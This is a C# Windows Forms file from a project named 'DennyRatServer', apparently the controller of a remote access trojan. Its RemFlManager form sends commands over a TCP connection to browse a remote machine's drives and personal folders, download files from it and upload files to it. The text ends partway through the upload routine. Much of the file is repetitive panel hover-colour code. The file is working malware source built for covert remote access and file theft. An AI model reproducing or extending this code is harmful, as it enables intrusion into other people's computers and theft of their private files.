using Microsoft.WindowsAPICodePack.Dialogs;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class RemFlManager : Form
    {
        private TcpClient cli;
        private NetworkStream mainStream;
        private string currentpath = "base";

        private string lastpath = "base";

        public RemFlManager(TcpClient ci)
        {
            cli = ci;
            InitializeComponent();
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void RemFlManager_Load(object sender, EventArgs e)
        {
            ImageList imgs = new ImageList();
            imgs.ImageSize = new Size(100, 100);

            imgs.Images.Add(Properties.Resources.folderico);
            imgs.Images.Add(Properties.Resources.fileico);

            listView1.LargeImageList = imgs;
            //listView1.Items.Add("Folder Test", 0);
            //listView1.Items.Add("Folder Test2", 0);
            //listView1.Items.Add("File Test", 1);
            //listView1.Items.Add("File Test2", 1);

            ShowDrives();
        }

        private void clearListViewItems()
        {
            listView1.Items.Clear();
        }

        private void addListViewItem(string name, int type, string path)
        {
            ListViewItem itm = new ListViewItem(name, type);
            itm.SubItems.Add(path);
            listView1.Items.Add(itm);
        }

        private void ShowDrives()
        {
            lastpath = currentpath;
            clearListViewItems();

            updatePath("base");

            SendCommand("flmanagerstart");

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string drivedirsstr = (string)binFormatter.Deserialize(mainStream);

            DirectoryInfo[] drivedirs = JsonConvert.DeserializeObject<DirectoryInfo[]>(drivedirsstr);

            foreach(DirectoryInfo di in drivedirs)
            {
                addListViewItem(di.Name, 0, di.FullName);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(lastpath == "base")
            {
                ShowDrives();
                return;
            }
            goIntoPath(lastpath);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (currentpath == "base") return;

            SendCommand("upfolder::" + currentpath);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string newpathd = (string)binFormatter.Deserialize(mainStream);

            if(newpathd == "base")
            {
                ShowDrives();
                return;
            }

            goIntoPath(newpathd);
        }

        private void updatePath(string newpath)
        {
            textBox1.Text = "Path: " + newpath;
            currentpath = newpath;
        }

        private void goIntoPath(string path)
        {
            lastpath = currentpath;

            clearListViewItems();

            updatePath(path);

            SendCommand("flmanagergoto::" + path);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string drivedirsstr = (string)binFormatter.Deserialize(mainStream);

            string[] splitdirsandfls = drivedirsstr.Split(new string[] { ":::separa:::" }, StringSplitOptions.None);

            DirectoryInfo[] subdirs = JsonConvert.DeserializeObject<DirectoryInfo[]>(splitdirsandfls[0]);

            foreach (DirectoryInfo di in subdirs)
            {
                addListViewItem(di.Name, 0, di.FullName);
            }


            FileInfo[] subfls = JsonConvert.DeserializeObject<FileInfo[]>(splitdirsandfls[1]);

            foreach (FileInfo fi in subfls)
            {
                addListViewItem(fi.Name, 1, fi.FullName);
            }
        }

        private string GetCertainPath(string cpath)
        {
            SendCommand("getcertainpath::" + cpath);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string newpathd = (string)binFormatter.Deserialize(mainStream);

            return newpathd;
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if(!(listView1.SelectedItems.Count <= 0))
            {
                if(listView1.SelectedItems[0].ImageIndex == 0)
                {
                    goIntoPath(listView1.SelectedItems[0].SubItems[1].Text);
                }
            }
        }

        #region leftsidestuff

        private void thisPCClick()
        {
            ShowDrives();
        }

        private void desktopClick()
        {
            goIntoPath(GetCertainPath("desktop"));
        }

        private void documentsClick()
        {
            goIntoPath(GetCertainPath("documents"));
        }

        private void downloadsClick()
        {
            goIntoPath(GetCertainPath("downloads"));
        }

        private void musicClick()
        {
            goIntoPath(GetCertainPath("music"));
        }

        private void picturesClick()
        {
            goIntoPath(GetCertainPath("pictures"));
        }

        private void videosClick()
        {
            goIntoPath(GetCertainPath("videos"));
        }

        private void panel1_Click(object sender, EventArgs e)
        {
            thisPCClick();
        }

        private void label1_Click(object sender, EventArgs e)
        {
            thisPCClick();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            thisPCClick();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            desktopClick();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            desktopClick();
        }

        private void panel2_Click(object sender, EventArgs e)
        {
            desktopClick();
        }

        private void panel3_Click(object sender, EventArgs e)
        {
            documentsClick();
        }

        private void panel4_Click(object sender, EventArgs e)
        {
            downloadsClick();
        }

        private void panel5_Click(object sender, EventArgs e)
        {
            musicClick();
        }

        private void panel6_Click(object sender, EventArgs e)
        {
            picturesClick();
        }

        private void panel7_Click(object sender, EventArgs e)
        {
            videosClick();
        }

        private void label3_Click(object sender, EventArgs e)
        {
            documentsClick();
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            documentsClick();
        }

        private void label4_Click(object sender, EventArgs e)
        {
            downloadsClick();
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            downloadsClick();
        }

        private void label5_Click(object sender, EventArgs e)
        {
            musicClick();
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            musicClick();
        }

        private void label6_Click(object sender, EventArgs e)
        {
            picturesClick();
        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {
            picturesClick();
        }

        private void label7_Click(object sender, EventArgs e)
        {
            videosClick();
        }

        private void pictureBox7_Click(object sender, EventArgs e)
        {
            videosClick();
        }

        private bool panel1entered = false;
        private bool panel2entered = false;
        private bool panel3entered = false;
        private bool panel4entered = false;
        private bool panel5entered = false;
        private bool panel6entered = false;
        private bool panel7entered = false;
        private Color origcol = Color.FromArgb(240, 240, 240);
        private Color togotocol = Color.FromArgb(60, 160, 255);
        private int speedToChange = 15;
        private int compareAmt = 3;

        private void updatehovers_Tick(object sender, EventArgs e)
        {
            if (panel1entered)
            {
                Color panel1curcolor = panel1.BackColor;
                if(panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel1.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel1.BackColor = panel1curcolor;
                    }
                }

            }
            else
            {
                Color panel1curcolor = panel1.BackColor;
                if(panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel1.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel1.BackColor = panel1curcolor;
                    }
                }

            }

            if (panel2entered)
            {

                Color panel1curcolor = panel2.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel2.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel2.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel2.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel2.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel2.BackColor = panel1curcolor;
                    }
                }
            }

            if (panel3entered)
            {

                Color panel1curcolor = panel3.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel3.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel3.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel3.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel3.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel3.BackColor = panel1curcolor;
                    }
                }
            }

            if (panel4entered)
            {

                Color panel1curcolor = panel4.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel4.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel4.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel4.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel4.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel4.BackColor = panel1curcolor;
                    }
                }
            }
            
            if (panel5entered)
            {

                Color panel1curcolor = panel5.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel5.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel5.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel5.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel5.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel5.BackColor = panel1curcolor;
                    }
                }
            }

            if (panel6entered)
            {

                Color panel1curcolor = panel6.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel6.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel6.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel6.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel6.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel6.BackColor = panel1curcolor;
                    }
                }
            }

            if (panel7entered)
            {

                Color panel1curcolor = panel7.BackColor;
                if (panel1curcolor != togotocol)
                {
                    if ((Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt))
                    {
                        panel7.BackColor = togotocol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - togotocol.R) <= compareAmt) && !(panel1curcolor.R < togotocol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R - speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - togotocol.G) <= compareAmt) && !(panel1curcolor.G < togotocol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G - speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - togotocol.B) <= compareAmt) && !(panel1curcolor.B > togotocol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B + speedToChange);
                        }
                        panel7.BackColor = panel1curcolor;
                    }
                }
            }
            else
            {
                Color panel1curcolor = panel7.BackColor;
                if (panel1curcolor != origcol)
                {
                    if ((Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && (Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && (Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt))
                    {
                        panel7.BackColor = origcol;
                    }
                    else
                    {
                        if (!(Math.Abs(panel1curcolor.R - origcol.R) <= compareAmt) && !(panel1curcolor.R > origcol.R))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R + speedToChange, panel1curcolor.G, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.G - origcol.G) <= compareAmt) && !(panel1curcolor.G > origcol.G))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G + speedToChange, panel1curcolor.B);
                        }
                        if (!(Math.Abs(panel1curcolor.B - origcol.B) <= compareAmt) && !(panel1curcolor.B < origcol.B))
                        {
                            panel1curcolor = Color.FromArgb(panel1curcolor.R, panel1curcolor.G, panel1curcolor.B - speedToChange);
                        }
                        panel7.BackColor = panel1curcolor;
                    }
                }
            }
        }

        private void panel1_MouseLeave(object sender, EventArgs e)
        {
            panel1entered = false;
        }

        private void panel1_MouseEnter(object sender, EventArgs e)
        {
            panel1entered = true;
        }

        private void label1_MouseEnter(object sender, EventArgs e)
        {
            panel1entered = true;
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            panel1entered = false;
        }

        private void pictureBox1_MouseEnter(object sender, EventArgs e)
        {
            panel1entered = true;
        }

        private void pictureBox1_MouseLeave(object sender, EventArgs e)
        {
            panel1entered = false;
        }

        private void pictureBox2_MouseEnter(object sender, EventArgs e)
        {
            panel2entered = true;
        }

        private void label2_MouseEnter(object sender, EventArgs e)
        {
            panel2entered = true;
        }

        private void panel2_MouseEnter(object sender, EventArgs e)
        {
            panel2entered = true;
        }

        private void panel2_MouseLeave(object sender, EventArgs e)
        {
            panel2entered = false;
        }

        private void label2_MouseLeave(object sender, EventArgs e)
        {
            panel2entered = false;
        }

        private void pictureBox2_MouseLeave(object sender, EventArgs e)
        {
            panel2entered = false;
        }

        private void pictureBox3_MouseEnter(object sender, EventArgs e)
        {
            panel3entered = true;
        }

        private void label3_MouseEnter(object sender, EventArgs e)
        {
            panel3entered = true;
        }

        private void panel3_MouseEnter(object sender, EventArgs e)
        {
            panel3entered = true;
        }

        private void panel3_MouseLeave(object sender, EventArgs e)
        {
            panel3entered = false;
        }

        private void label3_MouseLeave(object sender, EventArgs e)
        {
            panel3entered = false;
        }

        private void pictureBox3_MouseLeave(object sender, EventArgs e)
        {
            panel3entered = false;
        }

        private void pictureBox4_MouseEnter(object sender, EventArgs e)
        {
            panel4entered = true;
        }

        private void label4_MouseEnter(object sender, EventArgs e)
        {
            panel4entered = true;
        }

        private void panel4_MouseEnter(object sender, EventArgs e)
        {
            panel4entered = true;
        }

        private void panel4_MouseLeave(object sender, EventArgs e)
        {
            panel4entered = false;
        }

        private void label4_MouseLeave(object sender, EventArgs e)
        {
            panel4entered = false;
        }

        private void pictureBox4_MouseLeave(object sender, EventArgs e)
        {
            panel4entered = false;
        }

        private void pictureBox5_MouseEnter(object sender, EventArgs e)
        {
            panel5entered = true;
        }

        private void label5_MouseEnter(object sender, EventArgs e)
        {
            panel5entered = true;
        }

        private void panel5_MouseEnter(object sender, EventArgs e)
        {
            panel5entered = true;
        }

        private void panel5_MouseLeave(object sender, EventArgs e)
        {
            panel5entered = false;
        }

        private void label5_MouseLeave(object sender, EventArgs e)
        {
            panel5entered = false;
        }

        private void pictureBox5_MouseLeave(object sender, EventArgs e)
        {
            panel5entered = false;
        }

        private void pictureBox6_MouseEnter(object sender, EventArgs e)
        {
            panel6entered = true;
        }

        private void label6_MouseEnter(object sender, EventArgs e)
        {
            panel6entered = true;
        }

        private void panel6_MouseEnter(object sender, EventArgs e)
        {
            panel6entered = true;
        }

        private void panel6_MouseLeave(object sender, EventArgs e)
        {
            panel6entered = false;
        }

        private void label6_MouseLeave(object sender, EventArgs e)
        {
            panel6entered = false;
        }

        private void pictureBox6_MouseLeave(object sender, EventArgs e)
        {
            panel6entered = false;
        }

        private void pictureBox7_MouseEnter(object sender, EventArgs e)
        {
            panel7entered = true;
        }

        private void label7_MouseEnter(object sender, EventArgs e)
        {
            panel7entered = true;
        }

        private void panel7_MouseEnter(object sender, EventArgs e)
        {
            panel7entered = true;
        }

        private void panel7_MouseLeave(object sender, EventArgs e)
        {
            panel7entered = false;
        }

        private void label7_MouseLeave(object sender, EventArgs e)
        {
            panel7entered = false;
        }

        private void pictureBox7_MouseLeave(object sender, EventArgs e)
        {
            panel7entered = false;
        }


        #endregion

        private void openFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!(listView1.SelectedItems.Count <= 0))
            {
                if (listView1.SelectedItems[0].ImageIndex == 0)
                {
                    goIntoPath(listView1.SelectedItems[0].SubItems[1].Text);
                }
                else
                {
                    MessageBox.Show("Not a folder");
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Double-click on folders to open them.\nRight click on folders and files in listview\nfor various options. No files greater than\n100 megabytes can be downloaded", "Help");
        }

        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(currentpath == "base")
            {
                MessageBox.Show("Cannot download from this path");
            }

            if(listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem itm in listView1.SelectedItems)
                {
                    if (itm.ImageIndex == 0)
                    {
                        MessageBox.Show("Only Select Files. Download a folder with the Download Folder option.");
                        return;
                    }
                }

                DialogResult dialogResult = MessageBox.Show(("Are you sure you want to save " + listView1.SelectedItems.Count + " items?"), "Confirmation", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.No)
                {
                    return;
                }
                
                CommonOpenFileDialog dialog = new CommonOpenFileDialog();
                dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                dialog.IsFolderPicker = true;
                dialog.Title = "Choose Folder to Save Selected Files";
                if (dialog.ShowDialog() == CommonFileDialogResult.Ok)
                {
                    loadText.Visible = true;
                    Application.DoEvents();

                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        string newlocalflname = Path.Combine(dialog.FileName, itm.Text);

                        SendCommand("downloadfl::" + itm.SubItems[1].Text);

                        BinaryFormatter binFormatter = new BinaryFormatter();

                        mainStream = cli.GetStream();
                        byte[] filebytes = (byte[])binFormatter.Deserialize(mainStream);

                        if(filebytes.Length <= 10)
                        {
                            try
                            {
                                if (Encoding.ASCII.GetString(filebytes) == "failure")
                                {
                                    MessageBox.Show("File too large");
                                }
                                else
                                {
                                    File.WriteAllBytes(newlocalflname, filebytes);
                                }
                            }
                            catch
                            {
                                File.WriteAllBytes(newlocalflname, filebytes);
                            }
                        }
                        else
                        {
                            File.WriteAllBytes(newlocalflname, filebytes);
                        }
                    }

                    loadText.Visible = false;
                }
            }
            else
            {
                MessageBox.Show("Nothing Selected");
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshLView();
        }

        private void RefreshLView()
        {
            if (currentpath == "base")
            {
                ShowDrives();
                return;
            }

            goIntoPath(currentpath);
        }

        private void listView1_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 1)
            {
                textBox2.Text = "Multiple Objects Selected";
            }
            else if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].ImageIndex == 1)
                {
                    SendCommand("getflinfo::" + listView1.SelectedItems[0].SubItems[1].Text);

                    BinaryFormatter binFormatter = new BinaryFormatter();

                    mainStream = cli.GetStream();
                    string flinfo = (string)binFormatter.Deserialize(mainStream);

                    textBox2.Text = "File Info: " + flinfo;
                }
                else
                {
                    textBox2.Text = "Folder Selected";
                }

            }
        }

        private void uploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(currentpath == "base")
            {
                MessageBox.Show("You Cannot Upload Files To Base Path");
                return;
            }

            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Title = "Pick File to Upload";
            openFileDialog1.Multiselect = false;

            openFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                loadText.Visible = true;
                Application.DoEvents();

                FileInfo fl = new FileInfo(openFileDialog1.FileName);
                long length = new System.IO.FileInfo(openFileDialog1.FileName).Length;
